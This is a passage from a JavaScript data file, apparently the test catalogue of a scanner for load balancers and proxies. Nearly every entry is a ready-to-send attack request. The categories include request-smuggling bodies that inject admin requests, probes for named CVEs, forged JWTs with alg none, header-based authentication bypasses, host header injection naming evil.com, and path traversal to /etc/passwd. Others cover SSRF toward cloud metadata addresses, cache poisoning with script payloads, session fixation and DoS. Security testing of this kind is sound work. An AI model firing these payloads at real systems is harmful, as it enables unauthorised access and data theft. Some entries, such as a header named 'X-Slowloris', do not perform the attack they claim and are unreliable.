                description: "Content-Length vs Transfer-Encoding desync attack",
                method: "POST",
                headers: {"Content-Length": "13", "Transfer-Encoding": "chunked"},
                severity: "critical",
                path: "/",
                body: "0\r\n\r\nSMUGGLED"
            },
            {
                name: "CL.TE Request Smuggling Advanced",
                description: "Advanced CL.TE with nested request",
                method: "POST",
                headers: {"Content-Length": "6", "Transfer-Encoding": "chunked"},
                severity: "critical",
                path: "/",
                body: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n"
            },
            {
                name: "TE.CL Request Smuggling Basic",
                description: "Transfer-Encoding vs Content-Length desync",
                method: "POST",
                headers: {"Transfer-Encoding": "chunked", "Content-Length": "3"},
                severity: "critical",
                path: "/",
                body: "8\r\nSMUGGLED\r\n0\r\n\r\n"
            },
            {
                name: "TE.CL Request Smuggling Advanced",
                description: "Advanced TE.CL with admin request injection",
                method: "POST",
                headers: {"Transfer-Encoding": "chunked", "Content-Length": "4"},
                severity: "critical",
                path: "/",
                body: "5c\r\nGET /admin HTTP/1.1\r\nHost: vulnerable-website.com\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
            },
            {
                name: "TE.TE Request Smuggling",
                description: "Double Transfer-Encoding header smuggling",
                method: "POST",
                headers: {"Transfer-Encoding": "chunked", "Transfer-Encoding ": "identity"},
                severity: "critical",
                path: "/",
                body: "5\r\nSMUGG\r\n0\r\n\r\n"
            },
            {
                name: "TE.TE Space Obfuscation",
                description: "Transfer-Encoding with space obfuscation",
                method: "POST",
                headers: {"Transfer-Encoding": "chunked", "Transfer-Encoding\t": "identity"},
                severity: "critical",
                path: "/",
                body: "4\r\ntest\r\n0\r\n\r\n"
            },
            {
                name: "HTTP/2 Downgrade Smuggling",
                description: "HTTP/2 to HTTP/1.1 protocol downgrade attack",
                method: "GET",
                headers: {"Connection": "Upgrade, HTTP2-Settings", "Upgrade": "h2c"},
                severity: "critical",
                path: "/"
            },
            {
                name: "HTTP/2 Request Smuggling",
                description: "HTTP/2 specific request smuggling",
                method: "POST",
                headers: {"Content-Length": "0"},
                severity: "critical",
                path: "/",
                body: "GET /admin HTTP/1.1\r\nHost: backend\r\n\r\n"
            },
            {
                name: "Space-based TE Smuggling",
                description: "Transfer-Encoding with space character bypass",
                method: "POST",
                headers: {"Transfer-Encoding ": "chunked", "Content-Length": "4"},
                severity: "high",
                path: "/",
                body: "1\r\nZ\r\nQ\r\n"
            },
            {
                name: "Tab-based TE Smuggling",
                description: "Transfer-Encoding with tab character bypass",
                method: "POST",
                headers: {"Transfer-Encoding\t": "chunked", "Content-Length": "4"},
                severity: "high",
                path: "/",
                body: "1\r\nZ\r\nQ\r\n"
            },
            {
                name: "Newline-based TE Smuggling",
                description: "Transfer-Encoding with newline bypass",
                method: "POST",
                headers: {"Transfer-Encoding\r": "chunked", "Content-Length": "4"},
                severity: "high",
                path: "/",
                body: "1\r\nZ\r\nQ\r\n"
            },
            {
                name: "Mixed Case TE Smuggling",
                description: "Transfer-Encoding with mixed case bypass",
                method: "POST",
                headers: {"Transfer-encoding": "chunked", "Content-Length": "4"},
                severity: "high",
                path: "/",
                body: "1\r\nZ\r\nQ\r\n"
            },
            {
                name: "Duplicate Content-Length",
                description: "Duplicate Content-Length headers for smuggling",
                method: "POST",
                headers: {"Content-Length": "6", "Content-Length": "5"},
                severity: "high",
                path: "/",
                body: "SMUGG"
            },
            {
                name: "Zero-Length Chunk Smuggling",
                description: "Smuggling using zero-length chunks",
                method: "POST",
                headers: {"Transfer-Encoding": "chunked"},
                severity: "medium",
                path: "/",
                body: "0\r\nX-Injected-Header: value\r\n\r\n"
            }
        ]
    },
    "Known CVE Exploits": {
        icon: "fa-bug",
        tests: [
            {
                name: "F5 BIG-IP iControl RCE (CVE-2022-1388)",
                description: "F5 BIG-IP iControl REST authentication bypass leading to RCE",
                method: "POST",
                headers: {"Host": "localhost", "Authorization": "Basic YWRtaW46", "Content-Type": "application/json"},
                severity: "critical",
                path: "/mgmt/tm/util/bash"
            },
            {
                name: "F5 BIG-IP TMUI RCE (CVE-2021-22986)",
                description: "F5 BIG-IP TMUI RCE via iControl REST",
                method: "POST",
                headers: {"Host": "localhost", "Authorization": "Basic YWRtaW46"},
                severity: "critical",
                path: "/mgmt/tm/sys/bash"
            },
            {
                name: "Kemp LoadMaster RCE (CVE-2024-7591)",
                description: "Progress Kemp LoadMaster unauthenticated RCE",
                method: "GET",
                headers: {},
                severity: "critical",
                path: "/access/geo"
            },
            {
                name: "Kemp LoadMaster Auth Bypass (CVE-2024-1442)",
                description: "Kemp LoadMaster authentication bypass",
                method: "GET",
                headers: {},
                severity: "critical",
                path: "/access/login"
            },
            {
                name: "VMware Avi LoadBalancer Info Disclosure (CVE-2024-22266)",
                description: "VMware Avi Load Balancer cloud credentials disclosure",
                method: "GET",
                headers: {"X-Avi-Version": "1.0"},
                severity: "high",
                path: "/api/cloud-connector/status"
            },
            {
                name: "VMware Avi LoadBalancer Privilege Escalation (CVE-2024-22264)",
                description: "VMware Avi Load Balancer privilege escalation",
                method: "POST",
                headers: {"X-Avi-Version": "1.0", "Content-Type": "application/json"},
                severity: "critical",
                path: "/api/admin/users"
            },
            {
                name: "Citrix ADC Directory Traversal (CVE-2023-4966)",
                description: "Citrix NetScaler ADC directory traversal",
                method: "GET",
                headers: {},
                severity: "critical",
                path: "/oauth/idp/.well-known/openid_connect_configuration"
            },
            {
                name: "Citrix ADC Buffer Overflow (CVE-2023-3519)",
                description: "Citrix NetScaler ADC buffer overflow",
                method: "GET",
                headers: {},
                severity: "critical",
                path: "/gwtest/formssso"
            },
            {
                name: "HAProxy Stats Exposure",
                description: "Access HAProxy statistics page",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/haproxy?stats"
            },
            {
                name: "HAProxy Config Exposure",
                description: "Access HAProxy configuration",
                method: "GET",
                headers: {},
                severity: "high",
                path: "/haproxy-config"
            },
            {
                name: "Nginx Status Page",
                description: "Access Nginx status and metrics",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/nginx_status"
            },
            {
                name: "Nginx Plus API",
                description: "Access Nginx Plus API interface",
                method: "GET",
                headers: {},
                severity: "high",
                path: "/api/"
            },
            {
                name: "Apache Balancer Manager",
                description: "Access Apache mod_proxy_balancer manager",
                method: "GET",
                headers: {},
                severity: "high",
                path: "/balancer-manager"
            },
            {
                name: "Apache Server Status",
                description: "Access Apache server-status page",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/server-status"
            },
            {
                name: "Apache Server Info",
                description: "Access Apache server-info page",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/server-info"
            },
            {
                name: "Traefik Dashboard",
                description: "Access Traefik dashboard without authentication",
                method: "GET",
                headers: {},
                severity: "high",
                path: "/dashboard/"
            },
            {
                name: "Envoy Admin Interface",
                description: "Access Envoy proxy admin interface",
                method: "GET",
                headers: {},
                severity: "critical",
                path: "/admin"
            },
            {
                name: "Kong Admin API",
                description: "Access Kong API Gateway admin interface",
                method: "GET",
                headers: {},
                severity: "critical",
                path: "/admin-api"
            }
        ]
    },
    "Authentication Bypass": {
        icon: "fa-unlock",
        tests: [
            {
                name: "AWS ALB JWT Bypass (ALBeast)",
                description: "Bypass AWS ALB authentication using forged JWT",
                method: "GET",
                headers: {"Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1Njc4OTAiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJhZG1pbiIsImF1ZCI6WyJhd3MtYWxiIl0sImlzcyI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vdXMtZWFzdC0xX2ZhbTkxMjM0NSIsImV4cCI6MjAwMDAwMDAwMH0.signature"},
                severity: "critical",
                path: "/admin"
            },
            {
                name: "JWT Algorithm Confusion HS256",
                description: "Change JWT algorithm from RS256 to HS256",
                method: "GET",
                headers: {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTk5OTk5OTk5OX0.invalid"},
                severity: "high",
                path: "/admin"
            },
            {
                name: "JWT Algorithm Confusion None",
                description: "Change JWT algorithm to none",
                method: "GET",
                headers: {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTk5OTk5OTk5OX0."},
                severity: "critical",
                path: "/admin"
            },
            {
                name: "JWT Kid Parameter Injection",
                description: "Inject malicious kid parameter in JWT",
                method: "GET",
                headers: {"Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJhZG1pbiJ9.invalid"},
                severity: "high",
                path: "/admin"
            },
            {
                name: "X-Original-URL Bypass",
                description: "Bypass authentication using X-Original-URL header",
                method: "GET",
                headers: {"X-Original-URL": "/admin"},
                severity: "high",
                path: "/public"
            },
            {
                name: "X-Rewrite-URL Bypass",
                description: "Bypass using X-Rewrite-URL header",
                method: "GET",
                headers: {"X-Rewrite-URL": "/admin"},
                severity: "high",
                path: "/public"
            },
            {
                name: "X-Override-URL Bypass",
                description: "Bypass using X-Override-URL header",
                method: "GET",
                headers: {"X-Override-URL": "/admin"},
                severity: "high",
                path: "/public"
            },
            {
                name: "HTTP Method Override GET",
                description: "Use method override to bypass restrictions",
                method: "POST",
                headers: {"X-HTTP-Method-Override": "GET", "Content-Length": "0"},
                severity: "medium",
                path: "/admin"
            },
            {
                name: "HTTP Method Override PUT",
                description: "Use PUT method override",
                method: "GET",
                headers: {"X-HTTP-Method-Override": "PUT"},
                severity: "medium",
                path: "/admin"
            },
            {
                name: "HTTP Method Override DELETE",
                description: "Use DELETE method override",
                method: "GET",
                headers: {"X-HTTP-Method-Override": "DELETE"},
                severity: "high",
                path: "/admin"
            },
            {
                name: "HTTP Method Override PATCH",
                description: "Use PATCH method override",
                method: "GET",
                headers: {"X-HTTP-Method-Override": "PATCH"},
                severity: "medium",
                path: "/admin"
            },
            {
                name: "X-Original-Method Bypass",
                description: "Bypass using X-Original-Method header",
                method: "POST",
                headers: {"X-Original-Method": "GET"},
                severity: "medium",
                path: "/admin"
            },
            {
                name: "X-Forwarded-User Injection",
                description: "Inject user via X-Forwarded-User header",
                method: "GET",
                headers: {"X-Forwarded-User": "admin"},
                severity: "high",
                path: "/admin"
            },
            {
                name: "X-Remote-User Injection",
                description: "Inject user via X-Remote-User header",
                method: "GET",
                headers: {"X-Remote-User": "administrator"},
                severity: "high",
                path: "/admin"
            },
            {
                name: "X-Authenticated-User Injection",
                description: "Inject authenticated user header",
                method: "GET",
                headers: {"X-Authenticated-User": "root"},
                severity: "high",
                path: "/admin"
            },
            {
                name: "Authorization Header Injection",
                description: "Inject authorization header bypass",
                method: "GET",
                headers: {"X-Authorization": "Bearer admin-token"},
                severity: "high",
                path: "/admin"
            },
            {
                name: "Client Certificate Bypass",
                description: "Bypass client certificate authentication",
                method: "GET",
                headers: {"X-Client-Cert": "present", "X-SSL-Client-Verify": "SUCCESS"},
                severity: "high",
                path: "/admin"
            }
        ]
    },
    "Host Header Injection": {
        icon: "fa-globe",
        tests: [
            {
                name: "Host Header Injection Basic",
                description: "Basic host header injection for cache poisoning",
                method: "GET",
                headers: {"Host": "evil.com"},
                severity: "high",
                path: "/"
            },
            {
                name: "Host Header Injection with Port",
                description: "Host header injection with malicious port",
                method: "GET",
                headers: {"Host": "evil.com:80"},
                severity: "high",
                path: "/"
            },
            {
                name: "X-Forwarded-Host Override",
                description: "Override actual host with X-Forwarded-Host",
                method: "GET",
                headers: {"X-Forwarded-Host": "evil.com"},
                severity: "high",
                path: "/"
            },
            {
                name: "X-Host Override",
                description: "Override host with X-Host header",
                method: "GET",
                headers: {"X-Host": "attacker.com"},
                severity: "high",
                path: "/"
            },
            {
                name: "X-HTTP-Host Override",
                description: "Override host with X-HTTP-Host header",
                method: "GET",
                headers: {"X-HTTP-Host": "malicious.com"},
                severity: "high",
                path: "/"
            },
            {
                name: "Duplicate Host Headers",
                description: "Send duplicate host headers",
                method: "GET",
                headers: {"Host": "TARGET\r\nHost: evil.com"},
                severity: "high",
                path: "/"
            },
            {
                name: "Port Injection in Host",
                description: "Inject port in host header",
                method: "GET",
                headers: {"Host": "TARGET:22"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Port Injection SSH",
                description: "Inject SSH port in host header",
                method: "GET",
                headers: {"Host": "TARGET:22"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Port Injection FTP",
                description: "Inject FTP port in host header",
                method: "GET",
                headers: {"Host": "TARGET:21"},
                severity: "medium",
                path: "/"
            },
            {
                name: "SNI vs Host Mismatch",
                description: "Test SNI and Host header mismatch",
                method: "GET",
                headers: {"Host": "different.com"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Host Header with Path",
                description: "Include path in host header",
                method: "GET",
                headers: {"Host": "TARGET/admin"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Host Header with Query",
                description: "Include query parameters in host header",
                method: "GET",
                headers: {"Host": "TARGET?param=value"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Host Header URL Encoding",
                description: "URL encode malicious host header",
                method: "GET",
                headers: {"Host": "evil%2ecom"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Host Header Unicode",
                description: "Unicode characters in host header",
                method: "GET",
                headers: {"Host": "–µvil.com"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Host Header CRLF Injection",
                description: "CRLF injection in host header",
                method: "GET",
                headers: {"Host": "TARGET\r\nX-Injected-Header: value"},
                severity: "high",
                path: "/"
            }
        ]
    },
    "Path Traversal & SSRF": {
        icon: "fa-folder-open",
        tests: [
            {
                name: "Path Traversal Basic",
                description: "Basic path traversal using ../ sequences",
                method: "GET",
                headers: {},
                severity: "high",
                path: "/../../../etc/passwd"
            },
            {
                name: "Path Traversal URL Encoding",
                description: "Path traversal using URL encoding",
                method: "GET",
                headers: {},
                severity: "high",
                path: "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
            },
            {
                name: "Path Traversal Double Encoding",
                description: "Path traversal using double URL encoding",
                method: "GET",
                headers: {},
                severity: "high",
                path: "/%252e%252e/%252e%252e/etc/passwd"
            },
            {
                name: "Path Traversal Unicode",
                description: "Path traversal using Unicode encoding",
                method: "GET",
                headers: {},
                severity: "high",
                path: "/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
            },
            {
                name: "Path Traversal Windows",
                description: "Windows-specific path traversal",
                method: "GET",
                headers: {},
                severity: "high",
                path: "/..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            },
            {
                name: "AWS Metadata Service SSRF",
                description: "Access AWS metadata service via SSRF",
                method: "GET",
                headers: {"X-Forwarded-For": "169.254.169.254", "X-Real-IP": "169.254.169.254"},
                severity: "critical",
                path: "/"
            },
            {
                name: "AWS Metadata v2 SSRF",
                description: "Access AWS metadata service v2",
                method: "PUT",
                headers: {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                severity: "critical",
                path: "/latest/api/token"
            },
            {
                name: "Azure Metadata Service SSRF",
                description: "Access Azure metadata service",
                method: "GET",
                headers: {"X-Forwarded-For": "169.254.169.254", "Metadata": "true"},
                severity: "critical",
                path: "/"
            },
            {
                name: "GCP Metadata Service SSRF",
                description: "Access Google Cloud metadata service",
                method: "GET",
                headers: {"X-Forwarded-For": "metadata.google.internal", "Metadata-Flavor": "Google"},
                severity: "critical",
                path: "/"
            },
            {
                name: "Oracle Cloud Metadata SSRF",
                description: "Access Oracle Cloud metadata service",
                method: "GET",
                headers: {"X-Forwarded-For": "169.254.169.254", "Authorization": "Bearer Oracle"},
                severity: "critical",
                path: "/"
            },
            {
                name: "DigitalOcean Metadata SSRF",
                description: "Access DigitalOcean metadata service",
                method: "GET",
                headers: {"X-Forwarded-For": "169.254.169.254"},
                severity: "critical",
                path: "/metadata/v1/"
            },
            {
                name: "Kubernetes API SSRF",
                description: "Access Kubernetes API server",
                method: "GET",
                headers: {"X-Forwarded-For": "10.96.0.1"},
                severity: "critical",
                path: "/"
            },
            {
                name: "Docker API SSRF",
                description: "Access Docker daemon API",
                method: "GET",
                headers: {"X-Forwarded-For": "127.0.0.1:2375"},
                severity: "critical",
                path: "/"
            },
            {
                name: "Consul SSRF",
                description: "Access HashiCorp Consul",
                method: "GET",
                headers: {"X-Forwarded-For": "127.0.0.1:8500"},
                severity: "high",
                path: "/"
            },
            {
                name: "Etcd SSRF",
                description: "Access etcd key-value store",
                method: "GET",
                headers: {"X-Forwarded-For": "127.0.0.1:2379"},
                severity: "high",
                path: "/"
            },
            {
                name: "Redis SSRF",
                description: "Access Redis instance",
                method: "GET",
                headers: {"X-Forwarded-For": "127.0.0.1:6379"},
                severity: "high",
                path: "/"
            },
            {
                name: "Internal Network Scan",
                description: "Scan internal network via headers",
                method: "GET",
                headers: {"X-Forwarded-For": "192.168.1.1"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Localhost Access",
                description: "Access localhost services",
                method: "GET",
                headers: {"X-Forwarded-For": "127.0.0.1"},
                severity: "high",
                path: "/"
            },
            {
                name: "File:// Protocol SSRF",
                description: "Local file access via file protocol",
                method: "GET",
                headers: {},
                severity: "high",
                path: "/fetch?url=file:///etc/passwd"
            }
        ]
    },
    "Cache Poisoning": {
        icon: "fa-memory",
        tests: [
            {
                name: "Web Cache Deception Basic",
                description: "Cache private content as public using path confusion",
                method: "GET",
                headers: {"X-Original-URL": "/admin/profile"},
                severity: "high",
                path: "/admin/profile.css"
            },
            {
                name: "Web Cache Deception JS",
                description: "Cache deception using JavaScript extension",
                method: "GET",
                headers: {"X-Original-URL": "/admin/sensitive"},
                severity: "high",
                path: "/admin/sensitive.js"
            },
            {
                name: "Web Cache Deception PNG",
                description: "Cache deception using PNG extension",
                method: "GET",
                headers: {"X-Original-URL": "/admin/data"},
                severity: "high",
                path: "/admin/data.png"
            },
            {
                name: "Cache Key Poisoning Host",
                description: "Poison cache with unkeyed Host header",
                method: "GET",
                headers: {"X-Forwarded-Host": "evil.com", "X-Forwarded-Scheme": "https"},
                severity: "high",
                path: "/"
            },
            {
                name: "Cache Key Poisoning X-Forwarded-Proto",
                description: "Poison cache with X-Forwarded-Proto",
                method: "GET",
                headers: {"X-Forwarded-Proto": "https", "X-Forwarded-Host": "evil.com"},
                severity: "high",
                path: "/"
            },
            {
                name: "Cache Key Poisoning User-Agent",
                description: "Poison cache with User-Agent header",
                method: "GET",
                headers: {"User-Agent": "<script>alert(1)< /script>"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Fat GET Request Poisoning",
                description: "Cache poisoning using GET with body",
                method: "GET",
                headers: {"Content-Type": "application/x-www-form-urlencoded", "Content-Length": "12"},
                severity: "medium",
                path: "/?param=value",
                body: "injected=xss"
            },
            {
                name: "HTTP Header Pollution",
                description: "Pollute cache with duplicate headers",
                method: "GET",
                headers: {"X-Custom": "value1", "X-Custom ": "value2"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Vary Header Manipulation",
                description: "Manipulate caching via Vary header",
                method: "GET",
                headers: {"Vary": "User-Agent", "User-Agent": "<script>alert(1)< /script>"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Cache Control Override",
                description: "Override cache control directives",
                method: "GET",
                headers: {"Cache-Control": "public, max-age=31536000"},
                severity: "medium",
                path: "/"
            },
            {
                name: "ETag Manipulation",
                description: "Manipulate ETag for cache poisoning",
                method: "GET",
                headers: {"If-None-Match": "\"malicious-content\""},
                severity: "medium",
                path: "/"
            },
            {
                name: "Last-Modified Manipulation",
                description: "Manipulate Last-Modified header",
                method: "GET",
                headers: {"If-Modified-Since": "Wed, 21 Oct 2015 07:28:00 GMT"},
                severity: "low",
                path: "/"
            },
            {
                name: "Accept-Encoding Cache Poisoning",
                description: "Poison cache via Accept-Encoding",
                method: "GET",
                headers: {"Accept-Encoding": "gzip, deflate, <script>"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Accept-Language Cache Poisoning",
                description: "Poison cache via Accept-Language",
                method: "GET",
                headers: {"Accept-Language": "en-US,<script>alert(1)< /script>"},
                severity: "medium",
                path: "/"
            }
        ]
    },
    "Session Management": {
        icon: "fa-user-shield",
        tests: [
            {
                name: "Session Fixation PHPSESSID",
                description: "Force specific PHP session ID",
                method: "GET",
                headers: {"Cookie": "PHPSESSID=attacker_controlled_session"},
                severity: "high",
                path: "/"
            },
            {
                name: "Session Fixation JSESSIONID",
                description: "Force specific Java session ID",
                method: "GET",
                headers: {"Cookie": "JSESSIONID=attacker_session_12345"},
                severity: "high",
                path: "/"
            },
            {
                name: "Session Fixation ASPSESSIONID",
                description: "Force specific ASP.NET session ID",
                method: "GET",
                headers: {"Cookie": "ASP.NET_SessionId=attacker_session"},
                severity: "high",
                path: "/"
            },
            {
                name: "Sticky Session Manipulation",
                description: "Manipulate load balancer session affinity",
                method: "GET",
                headers: {"Cookie": "SERVERID=backend-1; JSESSIONID=admin_session"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Session Cookie Backend Route",
                description: "Route to specific backend via session cookie",
                method: "GET",
                headers: {"Cookie": "ROUTEID=server1.domain.com"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Session Prediction Sequential",
                description: "Attempt sequential session token prediction",
                method: "GET",
                headers: {"Cookie": "sessionid=00000001"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Session Prediction Incremental",
                description: "Attempt incremental session token prediction",
                method: "GET",
                headers: {"Cookie": "sessionid=12345678"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Session Hijacking via X-Session",
                description: "Hijack session via custom header",
                method: "GET",
                headers: {"X-Session-ID": "admin_session_token"},
                severity: "high",
                path: "/"
            },
            {
                name: "Session Token in URL",
                description: "Session token passed in URL parameter",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/?sessionid=admin_token_123"
            },
            {
                name: "Multiple Session Cookies",
                description: "Send multiple session cookies",
                method: "GET",
                headers: {"Cookie": "sessionid=user123; sessionid=admin456"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Session Cookie Overflow",
                description: "Send oversized session cookie",
                method: "GET",
                headers: {"Cookie": "sessionid=" + "A".repeat(4096)},
                severity: "medium",
                path: "/"
            },
            {
                name: "Session Domain Manipulation",
                description: "Manipulate session cookie domain",
                method: "GET",
                headers: {"Cookie": "sessionid=test; Domain=.evil.com"},
                severity: "medium",
                path: "/"
            }
        ]
    },
    "SSL/TLS Attacks": {
        icon: "fa-lock",
        tests: [
            {
                name: "SSL Offloading Bypass",
                description: "Bypass SSL termination at load balancer",
                method: "GET",
                headers: {"X-Forwarded-Proto": "http"},
                severity: "high",
                path: "/"
            },
            {
                name: "SSL Offloading Force HTTP",
                description: "Force HTTP protocol via headers",
                method: "GET",
                headers: {"X-Forwarded-SSL": "off", "X-Forwarded-Proto": "http"},
                severity: "high",
                path: "/"
            },
            {
                name: "SNI Manipulation Internal",
                description: "Server Name Indication manipulation for internal access",
                method: "GET",
                headers: {"Host": "internal.local"},
                severity: "high",
                path: "/"
            },
            {
                name: "SNI Manipulation Admin",
                description: "SNI manipulation for admin interface access",
                method: "GET",
                headers: {"Host": "admin.internal"},
                severity: "high",
                path: "/"
            },
            {
                name: "TLS Version Downgrade",
                description: "Force TLS version downgrade",
                method: "GET",
                headers: {"X-Forwarded-Proto": "https", "X-SSL-Protocol": "TLSv1.0"},
                severity: "medium",
                path: "/"
            },
            {
                name: "SSL Cipher Downgrade",
                description: "Force weak SSL cipher selection",
                method: "GET",
                headers: {"X-SSL-Cipher": "RC4-MD5"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Client Certificate Bypass",
                description: "Bypass client certificate authentication",
                method: "GET",
                headers: {"X-Client-Cert": "present", "X-SSL-Client-Verify": "SUCCESS"},
                severity: "high",
                path: "/"
            },
            {
                name: "Client Certificate Injection",
                description: "Inject fake client certificate",
                method: "GET",
                headers: {"X-SSL-Client-Cert": "-----BEGIN CERTIFICATE-----fake-----END CERTIFICATE-----"},
                severity: "high",
                path: "/"
            },
            {
                name: "HSTS Bypass",
                description: "Bypass HTTP Strict Transport Security",
                method: "GET",
                headers: {"X-Forwarded-Proto": "http"},
                severity: "medium",
                path: "/"
            },
            {
                name: "SSL Renegotiation",
                description: "Force SSL renegotiation",
                method: "GET",
                headers: {"Connection": "close", "X-SSL-Renegotiate": "true"},
                severity: "medium",
                path: "/"
            },
            {
                name: "SSL Session Resumption",
                description: "Test SSL session resumption vulnerabilities",
                method: "GET",
                headers: {"X-SSL-Session-ID": "test123"},
                severity: "low",
                path: "/"
            },
            {
                name: "ALPN Protocol Confusion",
                description: "Application Layer Protocol Negotiation confusion",
                method: "GET",
                headers: {"X-ALPN-Protocol": "h2c"},
                severity: "medium",
                path: "/"
            }
        ]
    },
    "Information Disclosure": {
        icon: "fa-eye",
        tests: [
            {
                name: "Apache Server Status",
                description: "Access Apache server-status page",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/server-status"
            },
            {
                name: "Apache Server Status Extended",
                description: "Access extended Apache server status",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/server-status?auto"
            },
            {
                name: "Apache Server Info",
                description: "Access Apache server-info page",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/server-info"
            },
            {
                name: "Nginx Status Basic",
                description: "Access basic Nginx status",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/basic_status"
            },
            {
                name: "Nginx Status Extended",
                description: "Access extended Nginx status",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/status"
            },
            {
                name: "Load Balancer Stats",
                description: "Access load balancer statistics",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/stats"
            },
            {
                name: "Load Balancer Health",
                description: "Access load balancer health information",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/health"
            },
            {
                name: "Backend Server Headers",
                description: "Force backend server header disclosure",
                method: "GET",
                headers: {"Connection": "close", "TE": "trailers"},
                severity: "low",
                path: "/"
            },
            {
                name: "Internal IP Disclosure",
                description: "Attempt to disclose internal IPs via headers",
                method: "GET",
                headers: {"X-Forwarded-For": "127.0.0.1", "X-Client-IP": "127.0.0.1"},
                severity: "low",
                path: "/"
            },
            {
                name: "X-Powered-By Header",
                description: "Discover technology stack via X-Powered-By",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/"
            },
            {
                name: "Server Version Disclosure",
                description: "Discover server version information",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/"
            },
            {
                name: "Error Page Information",
                description: "Trigger error pages for information disclosure",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/nonexistent-path"
            },
            {
                name: "HTTP Methods Discovery",
                description: "Discover allowed HTTP methods",
                method: "OPTIONS",
                headers: {},
                severity: "low",
                path: "/"
            },
            {
                name: "Debug Headers",
                description: "Check for debug headers",
                method: "GET",
                headers: {"X-Debug": "1", "Debug": "true"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Trace Method Information",
                description: "Use TRACE method for information disclosure",
                method: "TRACE",
                headers: {},
                severity: "low",
                path: "/"
            },
            {
                name: "Via Header Analysis",
                description: "Analyze Via header for proxy information",
                method: "GET",
                headers: {},
                severity: "low",
                path: "/"
            }
        ]
    },
    "WebSocket Attacks": {
        icon: "fa-plug",
        tests: [
            {
                name: "WebSocket Upgrade Hijacking",
                description: "Hijack WebSocket upgrade process",
                method: "GET",
                headers: {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                    "Sec-WebSocket-Version": "13"
                },
                severity: "medium",
                path: "/"
            },
            {
                name: "WebSocket Origin Bypass",
                description: "Bypass WebSocket origin validation",
                method: "GET",
                headers: {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Origin": "https://trusted.com",
                    "Sec-WebSocket-Key": "malicious_key"
                },
                severity: "medium",
                path: "/"
            },
            {
                name: "WebSocket Protocol Injection",
                description: "Inject malicious WebSocket protocol",
                method: "GET",
                headers: {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Sec-WebSocket-Protocol": "chat, superchat",
                    "Sec-WebSocket-Key": "test123"
                },
                severity: "medium",
                path: "/"
            },
            {
                name: "WebSocket Extension Abuse",
                description: "Abuse WebSocket extensions",
                method: "GET",
                headers: {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits=0",
                    "Sec-WebSocket-Key": "test123"
                },
                severity: "medium",
                path: "/"
            },
            {
                name: "WebSocket Version Manipulation",
                description: "Manipulate WebSocket version",
                method: "GET",
                headers: {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Sec-WebSocket-Version": "8",
                    "Sec-WebSocket-Key": "test123"
                },
                severity: "low",
                path: "/"
            },
            {
                name: "WebSocket Cross-Origin",
                description: "Test cross-origin WebSocket connections",
                method: "GET",
                headers: {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Origin": "http://evil.com",
                    "Sec-WebSocket-Key": "test123"
                },
                severity: "medium",
                path: "/"
            }
        ]
    },
    "DoS & Resource Exhaustion": {
        icon: "fa-bomb",
        tests: [
            {
                name: "Slowloris Attack",
                description: "Slow HTTP request to exhaust connections",
                method: "GET",
                headers: {"Connection": "keep-alive", "X-Slowloris": "true"},
                severity: "high",
                path: "/"
            },
            {
                name: "Slow POST Attack",
                description: "Slow POST request with partial body",
                method: "POST",
                headers: {"Content-Length": "1000000", "Content-Type": "application/x-www-form-urlencoded"},
